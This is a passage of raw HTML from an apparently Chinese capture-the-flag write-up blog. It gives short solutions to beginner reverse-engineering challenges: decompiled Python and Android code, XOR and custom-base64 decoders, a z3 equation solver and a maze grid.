class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># uncompyle6 version 3.9.0</span><br><span class=\"line\"># Python bytecode version base 3.4 (3310)</span><br><span class=\"line\"># Decompiled from: Python 3.8.6 (tags/v3.8.6:db45529, Sep 23 2020, 15:52:53) [MSC v.1927 64 bit (AMD64)]</span><br><span class=\"line\"># Embedded file name: src.py</span><br><span class=\"line\"># Compiled at: 1995-09-28 00:18:56</span><br><span class=\"line\"># Size of source mod 2**32: 272 bytes</span><br><span class=\"line\">import rsa, base64</span><br><span class=\"line\">key1 = rsa.PrivateKey.load_pkcs1(base64.b64decode(&#x27;LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcVFJQkFBS0NBUUVBcVJUZ0xQU3BuT0ZDQnJvNHR1K1FBWXFhTjI2Uk42TzY1bjBjUURGRy9vQ1NJSU00ClNBeEVWaytiZHpSN2FucVNtZ1l5MEhRWGhDZTM2U2VGZTF0ejlrd0taL3UzRUpvYzVBSzR1NXZ4UW5QOWY1cTYKYVFsbVAvVjJJTXB5NFFRNlBjbUVoNEtkNm81ZWRJUlB2SHd6V0dWS09OQ3BpL0taQ082V0tWYkpXcWh3WGpEQgpsSDFNVURzZ1gyVUM4b3Bodnk5dXIyek9kTlBocElJZHdIc1o5b0ZaWWtaMUx5Q0lRRXRZRmlKam1GUzJFQ1RVCkNvcU9acnQxaU5jNXVhZnFvZlB4eHlPb2wwYVVoVGhiaHE4cEpXL3FPSFdYd0xJbXdtNk96YXFVeks4NEYyY3UKYWRiRE5zeVNvaElHaHYzd0lBVThNSlFnOEthd1Z3ZHBzRWhlSXdJREFRQUJBb0lCQURBazdwUStjbEZtWHF1Vgp1UEoyRWxZdUJpMkVnVHNMbHZ0c1ltL3cyQnM5dHQ0bEh4QjgxYlNSNUYyMEJ2UlJ4STZ3OXlVZCtWZzdDd1lMCnA5bHhOL3JJdWluVHBkUEhYalNhaGNsOTVOdWNOWEZ4T0dVU05SZy9KNHk4dUt0VHpkV3NITjJORnJRa0o4Y2IKcWF5czNOM3RzWTJ0OUtrUndjbUJGUHNJalNNQzB5UkpQVEE4cmNqOFkranV3SHZjbUJPNHVFWXZXeXh0VHR2UQova0RQelBqdTBuakhkR055RytkSDdkeHVEV2Jxb3VZQnRMdzllZGxXdmIydTJ5YnZzTXl0NWZTOWF1a01NUjNoCnBhaDRMcU1LbC9ETTU3cE44Vms0ZTU3WE1zZUJLWm1hcEptcVNnSGdjajRPNWE2R1RvelN1TEVoTmVGY0l2Tm8KWFczTEFHRUNnWWtBc0J0WDNVcFQ3aUcveE5BZDdSWER2MENOY1k1QnNZOGY4NHQ3dGx0U2pjSWdBKy9nUjFMZQpzb2gxY1RRd1RadUYyRTJXL1hHU3orQmJDTVVySHNGWmh1bXV6aTBkbElNV3ZhU0dvSlV1OGpNODBlUjRiVTRyCmdYQnlLZVZqelkzNVlLejQ5TEVBcFRQcTZRYTVQbzhRYkF6czhuVjZtNXhOQkNPc0pQQ29zMGtCclFQaGo5M0cKOFFKNUFQWEpva0UrMmY3NXZlazZNMDdsaGlEUXR6LzRPYWRaZ1MvUVF0eWRLUmg2V3VEeGp3MytXeXc5ZjNUcAp5OXc0RmtLRzhqNVRpd1RzRmdzem94TGo5TmpSUWpqb3cyVFJGLzk3b2NxMGNwY1orMUtsZTI1cEJ3bk9yRDJBCkVpMUVkMGVEV3dJR2gzaFhGRmlRSzhTOG5remZkNGFMa1ZxK1V3S0JpRXRMSllIamFZY0N2dTd5M0JpbG1ZK0gKbGZIYkZKTkowaXRhazRZZi9XZkdlOUd6R1h6bEhYblBoZ2JrZlZKeEVBU3ZCOE5NYjZ5WkM5THdHY09JZnpLRApiczJQMUhuT29rWnF0WFNxMCt1UnBJdEkxNFJFUzYySDJnZTNuN2dlMzJSS0VCYnVKb3g3YWhBL1k2d3ZscUhiCjFPTEUvNnJRWk0xRVF6RjRBMmpENmdlREJVbHhWTUVDZVFDQjcyUmRoYktNL3M0TSsvMmYyZXI4Y2hwT01SV1oKaU5Hb3l6cHRrby9sSnRuZ1RSTkpYSXdxYVNCMldCcXpndHNSdEhGZnpaNlNyWlJCdTd5Y0FmS3dwSCtUd2tsNQpoS2hoSWFTNG1vaHhwUVNkL21td1JzbTN2NUNDdXEvaFNtNmNXYTdFOVZxc25heGQzV21tQ2VqTnp0MUxQWUZNCkxZMENnWWdKUHhpVTVraGs5cHB6TVAwdWU0clA0Z2YvTENldEdmQjlXMkIyQU03eW9VM2VsMWlCSEJqOEZ3UFQKQUhKUWtCeTNYZEh3SUpGTUV1RUZSSFFzcUFkSTlYVDBzL2V0QTg1Y3grQjhjUmt3bnFHakFseW1PdmJNOVNrMgptMnRwRi8rYm56ZVhNdFA3c0ZoR3NHOXJ5SEZ6UFNLY3NDSDhXWWx0Y1pTSlNDZHRTK21qblAwelArSjMKLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K&#x27;))</span><br><span class=\"line\">key2 = rsa.PublicKey.load_pkcs1(base64.b64decode(&#x27;LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXFSVGdMUFNwbk9GQ0JybzR0dStRQVlxYU4yNlJONk82NW4wY1FERkcvb0NTSUlNNFNBeEUKVmsrYmR6UjdhbnFTbWdZeTBIUVhoQ2UzNlNlRmUxdHo5a3dLWi91M0VKb2M1QUs0dTV2eFFuUDlmNXE2YVFsbQpQL1YySU1weTRRUTZQY21FaDRLZDZvNWVkSVJQdkh3eldHVktPTkNwaS9LWkNPNldLVmJKV3Fod1hqREJsSDFNClVEc2dYMlVDOG9waHZ5OXVyMnpPZE5QaHBJSWR3SHNaOW9GWllrWjFMeUNJUUV0WUZpSmptRlMyRUNUVUNvcU8KWnJ0MWlOYzV1YWZxb2ZQeHh5T29sMGFVaFRoYmhxOHBKVy9xT0hXWHdMSW13bTZPemFxVXpLODRGMmN1YWRiRApOc3lTb2hJR2h2M3dJQVU4TUpRZzhLYXdWd2Rwc0VoZUl3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">def encrypt1(message):</span><br><span class=\"line\">    crypto_text = rsa.encrypt(message.encode(), key2)</span><br><span class=\"line\">    return crypto_text</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def decrypt1(message):</span><br><span class=\"line\">    message_str = rsa.decrypt(message, key1).decode()</span><br><span class=\"line\">    return message_str</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def encrypt2(tips, key):</span><br><span class=\"line\">    ltips = len(tips)</span><br><span class=\"line\">    lkey = len(key)</span><br><span class=\"line\">    secret = []</span><br><span class=\"line\">    num = 0</span><br><span class=\"line\">    for each in tips:</span><br><span class=\"line\">        if num &gt;= lkey:</span><br><span class=\"line\">            num = num % lkey</span><br><span class=\"line\">        secret.append(chr(ord(each) ^ ord(key[num])))</span><br><span class=\"line\">        num += 1</span><br><span class=\"line\"></span><br><span class=\"line\">    return base64.b64encode(&#x27;&#x27;.join(secret).encode()).decode()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def decrypt2(secret, key):</span><br><span class=\"line\">    tips = base64.b64decode(secret.encode()).decode()</span><br><span class=\"line\">    ltips = len(tips)</span><br><span class=\"line\">    lkey = len(key)</span><br><span class=\"line\">    secret = []</span><br><span class=\"line\">    num = 0</span><br><span class=\"line\">    for each in tips:</span><br><span class=\"line\">        if num &gt;= lkey:</span><br><span class=\"line\">            num = num % lkey</span><br><span class=\"line\">        secret.append(chr(ord(each) ^ ord(key[num])))</span><br><span class=\"line\">        num += 1</span><br><span class=\"line\"></span><br><span class=\"line\">    return &#x27;&#x27;.join(secret)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">flag = &#x27;IAMrG1EOPkM5NRI1cChQDxEcGDZMURptPzgHJHUiN0ASDgUYUB4LGQMUGAtLCQcJJywcFmddNno/PBtQbiMWNxsGLiFuLwpiFlkyP084Ng0lKj8GUBMXcwEXPTJrRDMdNwMiHVkCBFklHgIAWQwgCz8YQhp6E1xUHgUELxMtSh0xXzxBEisbUyYGOx1DBBZWPg1CXFkvJEcxO0ADeBwzChIOQkdwXQRpQCJHCQsaFE4CIjMDcwswTBw4BS9mLVMLLDs8HVgeQkscGBEBFSpQFQQgPTVRAUpvHyAiV1oPE0kyADpDbF8AbyErBjNkPh9PHiY7O1ZaGBADMB0PEVwdCxI+MCcXARZiPhwfH1IfKitGOF42FV8FTxwqPzBPAVUUOAEKAHEEP2QZGjQVV1oIS0QBJgBDLx1jEAsWKGk5Nw03MVgmWSE4Qy5LEghoHDY+OQ9dXE44Th0=&#x27;</span><br><span class=\"line\">key = &#x27;this is key&#x27;</span><br><span class=\"line\">result = decrypt2(&#x27;AAAAAAAAAAAfFwwRSAIWWQ==&#x27;, key)</span><br><span class=\"line\">print(decrypt1(base64.b64decode(decrypt2(flag, result))))</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"litctf-2023enbase64\"><a class=\"anchor\" href=\"#litctf-2023enbase64\">#</a> [LitCTF 2023]enbase64</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\"></span><br><span class=\"line\">cipher = &#x27;GQTZlSqQXZ/ghxxwhju3hbuZ4wufWjujWrhYe7Rce7ju&#x27;</span><br><span class=\"line\">table = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><span class=\"line\">table_list = []</span><br><span class=\"line\">for s in table:</span><br><span class=\"line\">    table_list.append(ord(s))</span><br><span class=\"line\">v3 = [16, 34, 56, 7, 46, 2, 10, 44, 20, 41, 59, 31, 51, 60, 61, 26, 5, 40, 21, 38, 4, 54, 52, 47, 3, 11, 58, 48, 32, 15,</span><br><span class=\"line\">      49, 14, 37, 0, 55, 53, 24, 35, 18, 25, 33, 43, 50, 39, 12, 19, 13, 42, 9, 17, 28, 30, 23, 36, 1, 22, 57, 63, 8,</span><br><span class=\"line\">      27, 6, 62, 45, 29]</span><br><span class=\"line\">t_list = table_list.copy()</span><br><span class=\"line\">for i in range(48):</span><br><span class=\"line\">    for j in range(64):</span><br><span class=\"line\">        table_list[j] = t_list[v3[j]]</span><br><span class=\"line\">    t_list = table_list.copy()</span><br><span class=\"line\">t = &#x27;&#x27;</span><br><span class=\"line\">for x in table_list:</span><br><span class=\"line\">    t += chr(x)</span><br><span class=\"line\">table = str.maketrans(t, table)</span><br><span class=\"line\">flag = base64.b64decode(cipher.translate(table)).decode()</span><br><span class=\"line\">print(flag)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"nssctf-2022-spring-recruiteasy-python\"><a class=\"anchor\" href=\"#nssctf-2022-spring-recruiteasy-python\">#</a> [NSSCTF 2022 Spring Recruit]easy Python</h4>\n<p>打开后将那个加密字符进行 base64 解密即可得到 flag</p>\n<h4 id=\"swpuctf-2021-新生赛easyapp\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛easyapp\">#</a> [SWPUCTF 2021 新生赛] easyapp</h4>\n<p>使用 file 查看文件发现是一个 zip 改成 zip 后打开里面有个 apk 雷电模拟器启动后发现</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.ilililililil;</span><br><span class=\"line\"></span><br><span class=\"line\">/* loaded from: classes.dex */</span><br><span class=\"line\">public class Encoder &#123;</span><br><span class=\"line\">    private int key = 123456789;</span><br><span class=\"line\"></span><br><span class=\"line\">    public String encode(String str) &#123;</span><br><span class=\"line\">        StringBuilder sb = new StringBuilder();</span><br><span class=\"line\">        for (char c : str.toCharArray()) &#123;</span><br><span class=\"line\">            sb.append((char) (c ^ this.key));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return sb.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.ilililililil;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\"></span><br><span class=\"line\">/* loaded from: classes.dex */</span><br><span class=\"line\">public class MainActlvity &#123;</span><br><span class=\"line\">    public MainActlvity() &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Field declaredField = Encoder.class.getDeclaredField(&quot;key&quot;);</span><br><span class=\"line\">            declaredField.setAccessible(true);</span><br><span class=\"line\">            declaredField.set(MainActivity.encoder, 987654321);</span><br><span class=\"line\">        &#125; catch (IllegalAccessException | NoSuchFieldException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.ilililililil;</span><br><span class=\"line\"></span><br><span class=\"line\">import android.os.Bundle;</span><br><span class=\"line\">import android.view.View;</span><br><span class=\"line\">import android.widget.Button;</span><br><span class=\"line\">import android.widget.EditText;</span><br><span class=\"line\">import android.widget.Toast;</span><br><span class=\"line\">import androidx.appcompat.app.AppCompatActivity;</span><br><span class=\"line\"></span><br><span class=\"line\">/* loaded from: classes.dex */</span><br><span class=\"line\">public class MainActivity extends AppCompatActivity &#123;</span><br><span class=\"line\">    public static Encoder encoder;</span><br><span class=\"line\">    public static MainActlvity mainActlvity;</span><br><span class=\"line\"></span><br><span class=\"line\">    /* JADX INFO: Access modifiers changed from: protected */</span><br><span class=\"line\">    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br><span class=\"line\">    public void onCreate(Bundle savedInstanceState) &#123;</span><br><span class=\"line\">        super.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_main);</span><br><span class=\"line\">        final EditText editText = (EditText) findViewById(R.id.edit_text);</span><br><span class=\"line\">        encoder = new Encoder();</span><br><span class=\"line\">        mainActlvity = new MainActlvity();</span><br><span class=\"line\">        ((Button) findViewById(R.id.button)).setOnClickListener(new View.OnClickListener() &#123; // from class: com.example.ilililililil.-$$Lambda$MainActivity$i-SDaQT6aGr2btgF05Lf-fvXXSo</span><br><span class=\"line\">            @Override // android.view.View.OnClickListener</span><br><span class=\"line\">            public final void onClick(View view) &#123;</span><br><span class=\"line\">                MainActivity.this.lambda$onCreate$0$MainActivity(editText, view);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public /* synthetic */ void lambda$onCreate$0$MainActivity(final EditText editText, View v) &#123;</span><br><span class=\"line\">        System.out.println(encoder.encode(editText.getText().toString()));</span><br><span class=\"line\">        if (encoder.encode(editText.getText().toString()).equals(&quot;棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌&quot;)) &#123;</span><br><span class=\"line\">            Toast.makeText(this, &quot;YES&quot;, 0).show();</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            Toast.makeText(this, &quot;NO&quot;, 0).show();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>意思就要需要这个</p>\n<p>equals (&quot;棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌&quot;)</p>\n<p>那么我们就要去为了得到这个来进行异或</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">code=&#x27;棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌&#x27;</span><br><span class=\"line\">print(len(code))</span><br><span class=\"line\">key = 987654321</span><br><span class=\"line\">flag=&quot;&quot;</span><br><span class=\"line\">for i in code:</span><br><span class=\"line\">    flag+=chr((ord(i)^key)%128) #确定在0~128</span><br><span class=\"line\">    print(len(flag))</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"hubuctf-2022-新生赛ezpython\"><a class=\"anchor\" href=\"#hubuctf-2022-新生赛ezpython\">#</a> [HUBUCTF 2022 新生赛] ezPython</h4>\n<p>使用 uncompyle6 得到 python 文件，然后根据样式直接进行逆向解密即可</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from Crypto.Util.number import *</span><br><span class=\"line\">ans = 22385992650816784030032474165</span><br><span class=\"line\">ans = long_to_bytes(ans)</span><br><span class=\"line\">print(ans)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"gdouctf-2023check_your_luck\"><a class=\"anchor\" href=\"#gdouctf-2023check_your_luck\">#</a> [GDOUCTF 2023]Check_Your_Luck</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from z3 import *</span><br><span class=\"line\">s=Solver()</span><br><span class=\"line\">v,w,x,y,z=Ints(&#x27;v w x y z&#x27;)</span><br><span class=\"line\">s.add(v * 23 + w * -32 + x * 98 + y * 55 + z * 90 == 333322)</span><br><span class=\"line\">s.add(v * 123 + w * -322 + x * 68 + y * 67 + z * 32 == 707724)</span><br><span class=\"line\">s.add(v * 266 + w * -34 + x * 43 + y * 8 + z * 32 == 1272529)</span><br><span class=\"line\">s.add(v * 343 + w * -352 + x * 58 + y * 65 + z * 5 == 1672457)</span><br><span class=\"line\">s.add(v * 231 + w * -321 + x * 938 + y * 555 + z * 970 == 3372367)</span><br><span class=\"line\">if s.check()==sat:</span><br><span class=\"line\">    a=s.model()</span><br><span class=\"line\">print(&quot;flag&#123;&quot; +str(a[v])+ &quot;_&quot; + str(a[w]) + &quot;_&quot; + str(a[x]) + &quot;_&quot; + str(a[y]) + &quot;_&quot; + str(a[z]) + &quot;&#125;&quot;)</span><br></pre></td></tr></table></figure></p>\n<p>就是一个 cpp 的题目使用 z3 来解出这个 5 元一次方程即可</p>\n<h4 id=\"hnctf-2022-week1贝斯是什么乐器啊\"><a class=\"anchor\" href=\"#hnctf-2022-week1贝斯是什么乐器啊\">#</a> [HNCTF 2022 Week1] 贝斯是什么乐器啊？</h4>\n<p>这个直接使用脚本就能解出</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\">d=&quot;TlJRQFBBdTs4alsrKFI6MjgwNi5p&quot;.encode()</span><br><span class=\"line\">a=base64.b64decode(d).decode()</span><br><span class=\"line\">a=[i for i in a]</span><br><span class=\"line\">for i in range(len(a)):</span><br><span class=\"line\">    c=ord(a[i])</span><br><span class=\"line\">    c+=i</span><br><span class=\"line\">    print(chr(c),end=&quot;&quot;)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"swpuctf-2022-新生赛base64-2\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛base64-2\">#</a> [SWPUCTF 2022 新生赛] base64-2</h4>\n<p>使用 strings 可以得到</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GyAGD1ETr3AcGKNkZ19PLKAyAwEsAIELHx1nFSH2IwyGsD==</span><br><span class=\"line\">This is flag!!</span><br><span class=\"line\">This is wrong</span><br><span class=\"line\">NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789+/</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"hnctf-2022-week1x0r\"><a class=\"anchor\" href=\"#hnctf-2022-week1x0r\">#</a> [HNCTF 2022 Week1]X0r</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=[0x3FE, 0x3EB, 0x3FB, 0x3E4, 0x3F6, 0x3D3, 0x3D0, 0x388,0x3CA, 0x3EF, 0x389, 0x3CB, 0x3EF, 0x3CB, 0x388, 0x3EF, 0x3D5,0x3D9, 0x3CB, 0x3D1, 0x3CD, 0x0A]</span><br><span class=\"line\">c=&quot;&quot;</span><br><span class=\"line\">for i in range(len(a)):</span><br><span class=\"line\">    d=((a[i]-900)^0x34)%128</span><br><span class=\"line\">    print(chr(d),end=&quot;&quot;)</span><br><span class=\"line\">    c+=chr(d)</span><br></pre></td></tr></table></figure></p>\n<p>记住要 128 来控制他不超出 ascii 值</p>\n<h4 id=\"hgame-2022-week1easyasm\"><a class=\"anchor\" href=\"#hgame-2022-week1easyasm\">#</a> [HGAME 2022 week1]easyasm</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=[0x91, 0x61, 0x01, 0xC1, 0x41, 0xA0, 0x60, 0x41, 0xD1, 0x21,0x14, 0xC1, 0x41, 0xE2, 0x50, 0xE1, 0xE2, 0x54, 0x20, 0xC1, 0xE2, 0x60, 0x14, 0x30, 0xD1, 0x51, 0xC0, 0x17]</span><br><span class=\"line\">c=&quot;&quot;</span><br><span class=\"line\">for i in range(len(a)):</span><br><span class=\"line\">    d=a[i]^0x17</span><br><span class=\"line\">    c += chr((d&gt;&gt;4)+(d&lt;&lt;4)&amp;0xff)</span><br><span class=\"line\">    print(c)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"bjdctf-2020easy\"><a class=\"anchor\" href=\"#bjdctf-2020easy\">#</a> [BJDCTF 2020]Easy</h4>\n<p>ida 修改程序使 call 调转到_ques 然后保存运行</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*   *   *   ***** *   * ***** ***** * *   ***** *   * *   *</span><br><span class=\"line\">*   *  * *  *     *  *    *     *   * *   *     *   * **  *</span><br><span class=\"line\">***** ***** *     ***     *     *   ***** ***   *   * * * *</span><br><span class=\"line\">*   * *   * *     * **    *     *     *   *     *   * *  **</span><br><span class=\"line\">*   * *   * ***** *   * *****   *     *   *     ***** *   *</span><br></pre></td></tr></table></figure></p>\n<p>提交 flag 即可</p>\n<h4 id=\"hubuctf-2022-新生赛help\"><a class=\"anchor\" href=\"#hubuctf-2022-新生赛help\">#</a> [HUBUCTF 2022 新生赛] help</h4>\n<p>得到迷宫</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span><br><span class=\"line\">[1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1]</span><br><span class=\"line\">[1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1]</span><br><span class=\"line\">[1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1]</span><br><span class=\"line\">[1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1]</span><br><span class=\"line\">[1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1]</span><br><span class=\"line\">[1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1]</span><br><span class=\"line\">[1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1]</span><br><span class=\"line\">[1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1]</span><br><span class=\"line\">[1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1]</span><br><span class=\"line\">[1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1]</span><br><span class=\"line\">[1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1]</span><br><span class=\"line\">[1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1]</span><br><span class=\"line\">[1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0]</span><br><span class=\"line\">[1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1]</span><br><span class=\"line\">[1, 0, 1, 1, 1, 1, 1, 1, 1, 